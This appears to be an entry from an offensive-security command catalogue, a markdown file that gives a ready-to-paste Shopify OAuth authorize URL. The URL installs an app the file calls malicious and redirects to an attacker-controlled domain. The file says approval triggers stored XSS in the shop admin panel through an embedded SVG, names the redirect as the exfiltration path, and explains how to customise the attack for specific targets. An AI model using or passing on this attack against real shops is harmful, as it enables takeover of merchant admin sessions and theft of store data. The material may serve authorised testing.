---
data: >-
  /admin/oauth/authorize?client_id=672a937d5eb24e10c756ea256c73bb8c&scope=read_products&redirect_uri=https://attackerdoma.in/93ba4bef-cff1-43b1-922d-0631bd387e2e.html&state=nonce
tags:
  - oauth
  - shopify
type: command
output: null
executor: browser
platforms:
  - Web
id: 618f7026-fcee-4a4e-8069-cead3bd14808
created_at: '2025-12-13T23:55:20.838Z'
updated_at: '2025-12-13T23:55:20.838Z'
verified: false
validated: true
submitted: true
---
# shopify-oauth-authorize-malicious-app

## Command

Visit the following URL in a browser on the target shop domain (e.g., prepend to https://$shop.myshopify.com):

/admin/oauth/authorize?client_id=672a937d5eb24e10c756ea256c73bb8c&scope=read_products&redirect_uri=https://attackerdoma.in/93ba4bef-cff1-43b1-922d-0631bd387e2e.html&state=nonce

## Description

This URL initiates OAuth authorization for a malicious Shopify app, installing it on the shop and triggering stored XSS in the admin panel via the embedded SVG icon.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| client_id | Identifies the malicious application (e.g., 672a937d5eb24e10c756ea256c73bb8c) | Yes |
| scope | Permissions requested (e.g., read_products) | Yes |
| redirect_uri | Post-auth redirect (e.g., attacker-controlled domain for exfiltration) | Yes |
| state | Nonce for CSRF protection (e.g., nonce) | Yes |

## Examples

### Basic Usage

Navigate to: https://example.myshopify.com/admin/oauth/authorize?client_id=672a937d5eb24e10c756ea256c73bb8c&scope=read_products&redirect_uri=https://attackerdoma.in/93ba4bef-cff1-43b1-922d-0631bd387e2e.html&state=nonce

### Advanced Usage

Customize client_id and redirect_uri for specific targeting, ensuring the app has the malicious SVG.

## Expected Output

OAuth consent page appears; upon approval, app installs, admin panel loads, and XSS payload (e.g., alert) executes, confirming vulnerability exploitation.

## Related

- [[Related Procedure]]
